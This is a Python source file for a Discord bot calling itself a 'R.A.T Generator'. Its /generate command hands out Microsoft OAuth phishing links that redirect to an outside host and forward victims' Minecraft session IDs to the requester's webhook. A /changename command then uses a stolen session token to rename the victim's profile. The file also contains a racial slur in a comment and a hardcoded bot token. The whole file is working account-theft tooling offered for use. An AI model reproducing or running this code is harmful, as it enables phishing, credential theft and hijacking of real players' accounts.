import discord
from discord.ext import commands
from configparser import ConfigParser
from discord.ext import commands
import requests
from keep_alive import keep_alive, setnwlimit, addwhitelist, removewhitelist
from threading import Thread
import json

intents = discord.Intents.default()
client = discord.Client(intents=intents)

config = ConfigParser()
bot = commands.Bot(command_prefix="slash", intents=intents)


def checkhookvalid(hook):
    try:     
        url = hook
        response = requests.get(url)
        kekw = response.json()
        type = str(kekw[str('type')])
        print(type)
        if type == "1":
            return True
        else:
            return False
    except:
        return False

@bot.slash_command(name="generate", description="Generate an OAuth link", guild_ids=[1506744441229152376])
async def generate(ctx, webhook: str):
    if checkhookvalid(webhook):
        user = ctx.author
        config.read('config.ini')
        config.set('hooks', str(user.id), webhook)
        with open('config.ini', 'w') as f:
            config.write(f)
        embedVar = discord.Embed(title="R.A.T Generator", description="Use this link to RAT people. \n If somebody clicks on your link and verifies then his SessionID will be sent to your webhook.", color=0x00ff00)
        #
        #
        # NIGGA WAIT!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! you see the "client_id="? replace mine with yours. AND WAIT AGAIN see "redirect_uri="? after the = same as client id replace my url with ypurs keep the /verify 
        # ChriSs#0001
        #
        url = "https://login.live.com/oauth20_authorize.srf?client_id=298a9847-3950-4d14-b360-b8d2ef3bc5d6&response_type=code&redirect_uri=https://mcauth.ru/verify&scope=XboxLive.signin+offline_access&state=" + str(user.id)
        embedVar.add_field(name="URL", value=url, inline=False)
        await ctx.respond("Making link You Can only see this", ephemeral=True)
        await ctx.respond(f"Adding webhook {user.mention}", embed=embedVar, ephemeral=True)
        await user.send(embed=embedVar)
        print(f"{user} Made a OAuth RAT")
    else:
        await ctx.respond("Invalid webhook")

@bot.slash_command(name="getconfig", description="Get the config",  guild_ids=[1506744441229152376])
@commands.has_permissions(administrator=True)
async def getconfig(ctx):
    await ctx.respond(file=discord.File('config.ini'), ephemeral=True)
    
@bot.slash_command(name="l", description="L", guild_ids=[1506744441229152376])
@commands.has_permissions(administrator=True)
async def limit(ctx, limit: int):
    nwlimit = setnwlimit(limit)
    await ctx.respond(content=f"Set dhook lim to {nwlimit}", ephemeral=True)

@bot.slash_command(name="a", description="A", guild_ids=[1506744441229152376])
@commands.has_permissions(administrator=True)
async def whitelist(ctx, name: str):
    whitelist = addwhitelist(name)
    await ctx.respond(content=f"Added {name} to Whitelist: {whitelist}", ephemeral=True)

@bot.slash_command(name="rm", description="Rm", guild_ids=[1506744441229152376])
@commands.has_permissions(administrator=True)
async def remove(ctx, name: str):
    whitelist = removewhitelist(name)
    await ctx.respond(content=f"Remove {name} from Whitelist: {whitelist}", ephemeral=True)

@bot.slash_command(name="changename", description="changes the name of the ssid you input")
async def changename(ctx, ssid, newname):
    await ctx.respond("Changing Name", ephemeral=True)
    user = ctx.author
    url = f"https://api.minecraftservices.com/minecraft/profile/name/{newname}"
    headers = {
            "Authorization": f"Bearer {ssid}"
        }
        
    try:
        response = requests.put(url, headers=headers)
        if response.status_code == 200:
           await  ctx.send(f"Successfully changed name to {newname}  https://namemc.com/search?q={newname} {user.mention}")
        else:
            error_message = response.json().get("errorMessage")
            if error_message:
                await ctx.send(f"{user.mention} Error {response.status_code}: {error_message}")
            else:
                await ctx.send(f"{user.mention} Error: {response.status_code}")
    except requests.exceptions.RequestException as e:
        await ctx.respond (f"Error: {str(e)}")
@bot.event
async def on_ready():
    activity = discord.Game(name="Ratting on Hypixel.net!", type=3)
    await bot.change_presence(status=discord.Status.idle, activity=activity)

keep_alive()
bot.run('MTUxMjMyNTE1NTI5MDg3Mzk4Nw.GE6hRu.XJ1_N7S7q9xsuI8svcpJjhuMnrvpaHZEuFoDpA')
